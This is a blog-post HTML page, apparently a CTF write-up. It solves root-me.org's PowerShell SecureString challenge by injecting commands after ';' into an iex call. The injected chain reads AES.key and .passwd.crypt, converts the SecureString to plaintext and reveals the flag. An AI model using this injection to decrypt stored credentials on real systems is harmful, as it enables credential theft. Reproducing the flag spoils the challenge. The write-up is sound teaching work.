@@ -1,0 +1,319 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-GX2L7MWQLN"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-GX2L7MWQLN');
+</script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+  <script>
+    window.MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      },
+      svg: {
+        fontCache: 'global'
+      }
+    };
+  </script>
+  
+  <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+  <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+  <style>
+          .MathJax {
+  font-size: 180%; /* Adjust the percentage as needed */
+}
+  </style>
+
+  <title>Powershell - SecureString - root-me.org</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Powershell - SecureString - root-me.org | Cecil Daemon’s Wish</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="Powershell - SecureString - root-me.org" />
+<meta name="author" content="J. Alex Buschinelli" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Introduction" />
+<meta property="og:description" content="Introduction" />
+<link rel="canonical" href="http://localhost:4000/powershell-securestring-root-me" />
+<meta property="og:url" content="http://localhost:4000/powershell-securestring-root-me" />
+<meta property="og:site_name" content="Cecil Daemon’s Wish" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-12-12T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Powershell - SecureString - root-me.org" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"J. Alex Buschinelli","url":"https://ashishchaudhary.in/hacker-blog"},"dateModified":"2023-12-12T00:00:00+00:00","datePublished":"2023-12-12T00:00:00+00:00","description":"Introduction","headline":"Powershell - SecureString - root-me.org","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/powershell-securestring-root-me"},"url":"http://localhost:4000/powershell-securestring-root-me"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <div style="display: flex; justify-content: center; align-items: center; text-decoration: none;">
+      <a href="/" style="display: flex; align-items: center; text-decoration: none;">
+          <img src="/assets/cecil.gif" alt="Cecil Daemon" style="margin-right: 20px;"/>
+          
+          
+          <h1>cecil@celestial:/powershell-securestring-root-me$</h1>
+      
+      </a>
+  </div>
+  <br>
+    </a>
+    <div class="header-links">
+      <a href="/"><h2 class="header-link">Home</h2></a>
+<a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  <h2>Powershell - SecureString - root-me.org</h2>
+  <time datetime="2023-12-12T00:00:00+00:00" class="by-line">12 Dec 2023</time>
+  <p>Estimated read time: 7 minutes</p>
+  <h1 id="introduction"><a href="#intro"></a>Introduction</h1>
+
+<p>Let’s do the level 2 of the Powershell - Command Injection CTF. You can check it out the level 1 write up <a href="/powershell-command-injection-root-me">here</a>. This CTF can be found under the App Script tab on <a href="https://www.root-me.org">Root-me</a>.</p>
+
+<h1 id="challenge-description"><a href="#level-description"></a>Challenge description</h1>
+<p>Let’s check the statement:</p>
+
+<blockquote>
+  <p>Statement</p>
+
+  <p>Recover the database’s password, with a twist!</p>
+</blockquote>
+
+<p>We have basically the same problem as the level 1, but with a probable more secure password to hack. To ssh into the machine, we need to run:</p>
+
+<p><code class="language-plaintext highlighter-rouge">ssh -p 2225 app-script-ch19@challenge05.root-me.org</code></p>
+
+<p>and provide the password: <code class="language-plaintext highlighter-rouge">app-script-ch19</code>.</p>
+
+<h1 id="approach-mindset"><a href="#approach"></a>Approach mindset</h1>
+
+<p>Let’s keep our approach mindset. For those who may not be closely following every release of our write-ups, this mindset is founded on four steps:</p>
+
+<ol>
+  <li>Understanding basic concepts</li>
+  <li>Understanding the problem</li>
+  <li>Crafting an attack</li>
+  <li>Solving</li>
+</ol>
+
+<p>These steps are interconnected, and when followed methodically, they make the subsequent steps more straightforward.</p>
+
+<h2 id="step-1---understanding-basic-concepts"><a href="#mindset-step1"></a>Step 1 - Understanding basic concepts</h2>
+
+<p>We have already covered the powershell basics <a href="/powershell-command-injection-root-me#step-1---understanding-basic-concepts">here</a>. However, what is the ‘PowerShell SecureString’? This was my first question, since I’m not at all fluent in this script language.</p>
+
+<p>As described by Microsoft:</p>
+
+<blockquote>
+  <p><em>The <code class="language-plaintext highlighter-rouge">ConvertTo-SecureString</code> cmdlet converts plain text to secure strings. […] The secure string can be converted back to an encrypted, standard string using the <code class="language-plaintext highlighter-rouge">ConvertFrom-SecureString</code> cmdlet. This enables it to be stored in a file for later use.</em></p>
+</blockquote>
+
+<p>One example of how we can use this is by creating a variable that reads user input and convert it to a secure string. Let’s see how this works by opening our Linux powershell:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS /home/kaizen&gt; <span class="nv">$secure</span> <span class="o">=</span> Read-Host <span class="nt">-AsSecureString</span>
+<span class="k">******</span>
+PS /home/kaizen&gt; <span class="nb">echo</span> <span class="nv">$secure</span>                        
+System.Security.SecureString
+</code></pre></div></div>
+
+<p>As we can see, the input has been converted to a secure string and we are not able to read it. We can encrypt our secure string by using the <code class="language-plaintext highlighter-rouge">ConvertFrom-SecureString</code> cmdlet:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS /home/kaizen&gt; <span class="nv">$encrypted</span> <span class="o">=</span> ConvertFrom-SecureString <span class="nt">-SecureString</span> <span class="nv">$secure</span>
+PS /home/kaizen&gt; <span class="nb">echo</span> <span class="nv">$encrypted</span>                                            
+6800690020006d006f006d00
+</code></pre></div></div>
+
+<p>Finally, to recover the secure string, we can use <code class="language-plaintext highlighter-rouge">ConvertTo-SecureString</code> cmdlet onto the <code class="language-plaintext highlighter-rouge">$encrypted</code> variable we created:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS /home/kaizen&gt; <span class="nv">$secure2</span> <span class="o">=</span> ConvertTo-SecureString <span class="nt">-String</span> <span class="nv">$encrypted</span>       
+PS /home/kaizen&gt; <span class="nv">$secure2</span>
+System.Security.SecureString
+</code></pre></div></div>
+
+<p>We could also create a secure string from an encrypted file:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS /home/kaizen&gt; <span class="nv">$encrypted</span> <span class="o">=</span> ConvertFrom-SecureString <span class="nt">-SecureString</span> <span class="nv">$secure</span> <span class="nt">-Key</span> <span class="o">(</span>1..16<span class="o">)</span>
+PS /home/kaizen&gt; <span class="nv">$encrypted</span> | Set-Content encrypted.txt                                  
+PS /home/kaizen&gt; <span class="nv">$secure2</span> <span class="o">=</span> Get-Content ./encrypted.txt | ConvertTo-SecureString <span class="nt">-Key</span> <span class="o">(</span>1..16<span class="o">)</span>
+PS /home/kaizen&gt; <span class="nv">$secure2</span>
+System.Security.SecureString
+</code></pre></div></div>
+
+<p>This is just the basics. If you are interesting in learning more aboute secure strings, go check it out at the <a href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring?view=powershell-7.4">Microsoft</a> official documentation.</p>
+
+<h2 id="-step-2---understanding-the-problem"><a href="#mindset-step1"></a> Step 2 - Understanding the problem</h2>
+
+<p>Let’s ssh into the machine and check it out. As soon as we are in, we are greeted with a CLI program, same as the level 1:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="nb">ls
+</span>Connect to the database With the secure Password: System.Security.SecureString. Backup th
+e table <span class="nb">ls
+</span>Table to dump:
+</code></pre></div></div>
+
+<p>Well, since we have already solved level 1, let’s use our approach to gather information. Let’s run our command injection <code class="language-plaintext highlighter-rouge">; ls</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="p">;</span> <span class="nb">ls
+</span>Connect to the database With the secure Password: System.Security.SecureString. Backup th
+e table
+
+
+    Directory: C:<span class="se">\c</span>ygwin64<span class="se">\c</span>hallenge<span class="se">\a</span>pp-script<span class="se">\c</span>h19
+
+
+Mode                LastWriteTime         Length Name
+<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>
+<span class="nt">-a----</span>       12/12/2021   9:25 AM             43 .git
+<span class="nt">-a----</span>       10/29/2020   9:27 AM            361 .passwd.crypt
+<span class="nt">------</span>       12/12/2021   9:50 AM            748 ._perms
+<span class="nt">-a----</span>       10/29/2020   9:23 AM            176 AES.key
+<span class="nt">-a----</span>       10/29/2020   9:30 AM            331 ch19.ps1
+</code></pre></div></div>
+
+<p>Nice! We have access to all of these files. But it seems our <code class="language-plaintext highlighter-rouge">.passwd</code> is encrypted. Let’s use <code class="language-plaintext highlighter-rouge">; cat .passwd.crypt</code> to see:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="p">;</span> <span class="nb">cat</span> .passwd.crypt
+Connect to the database With the secure Password: System.Security.SecureString. Backup th
+e table
+76492d1116743f0423413b16050a5345MgB8AEkAMQBwAEwAbgBoAHgARwBXAHkAMgB3AGcAdwB3AHQARQBqAEEAR
+QBPAEEAPQA9AHwAMgAyAGMANQA1ADIANwBiADEANQA4ADIANwAwAGIANAA2ADIAMQBlADAANwA3ADIAYgBkADYANg
+AyADUAYwAyAGMAYQBhAGUAMAA5ADUAMAA2ADUAYQBjADIAMQAzADIAMgA1AGYANgBkAGYAYgAxAGMAMgAwADUANQB
+kADIAMgA0AGQAYgBmADYAMQA4AGQAZgBkAGQAMwAwADUANAA4AGYAMAAyADgAZAAwADEAMgBmAGEAZQBmADgANAAy
+ADkA
+</code></pre></div></div>
+
+<p>Yep. This is not the answer, or else this problem would’ve been the same as the first one. Let’s take a look at the code <code class="language-plaintext highlighter-rouge">ch19.ps1</code> running the command <code class="language-plaintext highlighter-rouge">; cat ch19.ps1</code>:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$KeyFile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">"AES.key"</span><span class="w">
+</span><span class="nv">$key</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-Content</span><span class="w"> </span><span class="nv">$KeyFile</span><span class="w">
+</span><span class="nv">$SecurePassword</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-Content</span><span class="w"> </span><span class="o">.</span><span class="nf">passwd</span><span class="o">.</span><span class="nf">crypt</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">ConvertTo-SecureString</span><span class="w"> </span><span class="nt">-key</span><span class="w"> </span><span class="nv">$Key</span><span class="w">
+
+</span><span class="kr">while</span><span class="p">(</span><span class="bp">$true</span><span class="p">){</span><span class="w">
+        </span><span class="n">Write-Host</span><span class="w"> </span><span class="s2">"Table to dump:"</span><span class="w">
+        </span><span class="n">Write-Host</span><span class="w"> </span><span class="nt">-NoNewLine</span><span class="w"> </span><span class="s2">"&gt; "</span><span class="w">
+        </span><span class="nv">$table</span><span class="o">=</span><span class="n">Read-Host</span><span class="w">
+
+        </span><span class="n">iex</span><span class="w"> </span><span class="s2">"Write-Host Connect to the database With the secure Password: </span><span class="nv">$SecurePassword</span><span class="s2">
+. Backup the table </span><span class="nv">$table</span><span class="s2">"</span><span class="w">
+</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Hm. Interesting. So we could access the <code class="language-plaintext highlighter-rouge">$SecurePassword</code> variable, which might be a secure string version of the <code class="language-plaintext highlighter-rouge">.passwd.crypt</code>. To do this, we simply run:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="p">;</span> <span class="nb">echo</span> <span class="nv">$SecurePassword</span>
+Connect to the database With the secure Password: System.Security.SecureString. Backup th
+e table
+System.Security.SecureString
+</code></pre></div></div>
+
+<p>As we can see, we were right. This problem is using the techniques we found by Microsoft documentation to decrypt the password with the <code class="language-plaintext highlighter-rouge">ConvertTo-SecureString</code> cmdlet.</p>
+
+<p>Since we are able to access the powershell shell, we just need to find the command sequence to transform the secure string in readable format. One way to do that is by creating a variable that converts a secure string into a binary string (BSTR). This <a href="https://stackoverflow.com/questions/28352141/convert-a-secure-string-to-plain-text">post</a> talks about this.</p>
+
+<p>As we can see, we need a series of commands to get what we want. Before attempting on the machine, let’s try it out on my local PCs:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS /home/kaizen&gt; <span class="nv">$secure</span>
+System.Security.SecureString
+PS /home/kaizen&gt; <span class="nv">$BSTR</span> <span class="o">=</span> <span class="o">[</span>System.Runtime.InteropServices.Marshal]::SecureStringToBSTR<span class="o">(</span><span class="nv">$secure</span><span class="o">)</span>        
+PS /home/kaizen&gt; <span class="nv">$BSTR</span>
+140321549720616
+PS /home/kaizen&gt; <span class="nv">$unsecure</span> <span class="o">=</span> <span class="o">[</span>System.Runtime.InteropServices.Marshal]::PtrToStringAuto<span class="o">(</span><span class="nv">$BSTR</span><span class="o">)</span>
+PS /home/kaizen&gt; <span class="nv">$unsecure</span>
+hacked
+</code></pre></div></div>
+
+<p>But how could we get the plain text version of our <code class="language-plaintext highlighter-rouge">.passwd</code>? Well, that is where we get to our step 3.</p>
+
+<h2 id="step-3---crafting-the-attack"><a href="#mindset-step3"></a>Step 3 - Crafting the attack</h2>
+
+<p>Now that we understand the basic concepts and the CTF problem, the solution becomes clearer. Take a sip of your coffee, sit back and enjoy our findings!</p>
+
+<ol>
+  <li>
+    <p>We could detect a command injection vulnerability in this powershell CLI, where when user passes the <code class="language-plaintext highlighter-rouge">;</code> pipe, we can execute arbitrary code.</p>
+  </li>
+  <li>
+    <p>We know how to convert secure string into plain text.</p>
+  </li>
+</ol>
+
+<p>Uniting both, we can build the perfect attack! How about something like:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">;</span> <span class="nv">$key2</span> <span class="o">=</span> Get-Content <span class="nv">$KeyFile</span><span class="p">;</span> <span class="nv">$SecurePassword</span> <span class="o">=</span> Get-Content .passwd.crypt |
+ConvertTo-SecureString <span class="nt">-key</span> <span class="nv">$key2</span><span class="p">;</span> <span class="nv">$BSTR</span> <span class="o">=</span> <span class="o">[</span>System.Runtime.InteropServices.Marsh
+al]::SecureStringToBSTR<span class="o">(</span><span class="nv">$SecurePassword</span><span class="o">)</span><span class="p">;</span> <span class="nv">$PlainPassword</span> <span class="o">=</span> <span class="o">[</span>System.Runtime.Inter
+opServices.Marshal]::PtrToStringAuto<span class="o">(</span><span class="nv">$BSTR</span><span class="o">)</span><span class="p">;</span> <span class="nb">echo</span> <span class="nv">$PlainPassword</span>
+</code></pre></div></div>
+
+<p>Let’s understand this injection: first, we create a variable called <code class="language-plaintext highlighter-rouge">$key2</code> which will read the contents of the <code class="language-plaintext highlighter-rouge">$KeyFile</code> variable. After that, we proceed to decrypt the <code class="language-plaintext highlighter-rouge">.passwd.crypt</code> into a secure string using the <code class="language-plaintext highlighter-rouge">ConvertTo-SecureString</code> cmdlet, storing the result into <code class="language-plaintext highlighter-rouge">$SecurePassword</code> variable. After that, we simply apply our conversion from secure string to binary string, then to plain text, as we did in Step 2.</p>
+
+<p>If everything runs smoothly, we shall solve this problem.</p>
+
+<h2 id="-step-4---solving"><a href="#mindset-step4"></a> Step 4 - Solving!</h2>
+
+<p>Let’s try our attack payload to see what happens:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Table to dump:
+<span class="o">&gt;</span> <span class="p">;</span> <span class="nv">$key2</span> <span class="o">=</span> Get-Content <span class="nv">$KeyFile</span><span class="p">;</span> <span class="nv">$SecurePassword</span> <span class="o">=</span> Get-Content .passwd.crypt | ConvertTo
+<span class="nt">-SecureString</span> <span class="nt">-key</span> <span class="nv">$key2</span><span class="p">;</span> <span class="nv">$BSTR</span> <span class="o">=</span> <span class="o">[</span>System.Runtime.InteropServices.Marshal]::SecureStringT
+oBSTR<span class="o">(</span><span class="nv">$SecurePassword</span><span class="o">)</span><span class="p">;</span> <span class="nv">$PlainPassword</span> <span class="o">=</span> <span class="o">[</span>System.Runtime.InteropServices.Marshal]::PtrToS
+tringAuto<span class="o">(</span><span class="nv">$BSTR</span><span class="o">)</span><span class="p">;</span> <span class="nb">echo</span> <span class="nv">$PlainPassword</span>
+Connect to the database With the secure Password: System.Security.SecureString. Backup th
+e table
+SecureStringBypass
+</code></pre></div></div>
+
+<p>And there we have it! Our flag!</p>
+
+<h1 id="-conclusion"><a href="#conclusions"></a> Conclusion</h1>
+
+<p>In this CTF, we understood how secure strings work in powershell. We learned how to create secure strings and how to convert them back to a binary string. We also learned how to encrypt &amp; decrypt secure strings using <code class="language-plaintext highlighter-rouge">ConvertTo-SecureString</code> and <code class="language-plaintext highlighter-rouge">ConvertFrom-SecureString</code> cmdlets.</p>
+
+<p>We were able to solve this challenge because we found a command injection (thanks to our level 1 solution), followed by the conversion from secure string to binary string.</p>
+
+<p>I hope you liked this write-up and learned something now. As always, don’t forget to do your <strong>research!</strong></p>
+
+<p><a href="/">Go back</a></p>
+
+
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>Alex Buschinelli</b>
+    </span>
+    
+    <span>© 2023</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
